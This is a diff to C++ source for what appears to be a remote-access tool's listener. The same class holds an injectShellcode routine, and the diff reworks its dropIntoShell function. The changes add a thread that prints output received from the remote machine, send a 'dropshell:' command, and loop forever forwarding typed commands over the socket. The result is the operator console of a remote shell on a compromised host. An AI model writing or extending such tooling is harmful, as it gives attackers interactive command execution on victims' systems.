@@ -199,6 +199,21 @@ int listener::injectShellcode(string l_path) {
 	return 0;
 }
 
+void 
+*printingThing(void* in){
+	int new_fd = *(int*)in;
+	char* recvbuf = new char[2048];
+	int n = 1000;
+	int buflen = 2048;
+	int byte_recv;
+	do{
+		byte_recv = recv(new_fd, recvbuf, buflen, 0);
+		for(int i=0;i<byte_recv;i++){
+			printf("%c",recvbuf[i]);
+		}
+		n--;
+	}while(n>0);
+}
 int listener::dropIntoShell() {
 	printf("Dropping into Shell...\n");
 
@@ -208,8 +223,8 @@ int listener::dropIntoShell() {
 	memset(sendbuf, '\0', buflen);
 	memset(recvbuf, '\0', buflen);
 
-	string cmd = "dropshell:";
-	send(new_fd, cmd.c_str(), cmd.length(), 0);
+	char cmd[] = "dropshell:";
+	send(new_fd, cmd, strlen(cmd), 0);
 
 	printf("Dropped into shell!\n");
 
@@ -225,26 +240,38 @@ int listener::dropIntoShell() {
 	int bytes;
 	int byte_recv;
 	int n;
+	pthread_attr_t attr;
+	void* status;
+    // Initialize and set thread joinable
+    pthread_attr_init(&attr);
+    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
+	pthread_t t;
+	pthread_create(&t,&attr,printingThing,(void*)&new_fd);
 
 	do {
-
-		byte_recv = recv(new_fd, recvbuf, buflen, 0);
-		cout << recvbuf;	
-
 		//string data = "whoami\n";
 		//string data;
 		//getline(cin, data);
 		//strcpy(sendbuf, data.c_str());
 		n = 0;
-		while ((sendbuf[n++] = getchar()) != '\n');
-		//printf("Sending command: %s", sendbuf);
-		bytes = send(new_fd, sendbuf, sizeof(sendbuf), 0);
+		//while ((sendbuf[n++] = getchar()) != '\n');
+		fgets(sendbuf,1024,stdin);
+
+		n = strlen(sendbuf);
+		sendbuf[n]='\n'; sendbuf[n+1]='\0';
+		//string mess;
+		//getline(cin,mess);
+		//send(new_fd, mess.c_str(), mess.length(), 0);
+
+		bytes = send(new_fd, sendbuf, strlen(sendbuf), 0);
+
 		//bytes = send(new_fd, data.c_str(), data.length(), 0);
-
-		memset(recvbuf, '\0', buflen);
-		memset(sendbuf, '\0', buflen);
-	} while (byte_recv > 0);
-
+		/*
+		for(int i=0;i<byte_recv;i++){
+			printf("%c",recvbuf[i]);
+		}
+		*/
+	} while (true);
 	return 0;
 }
 
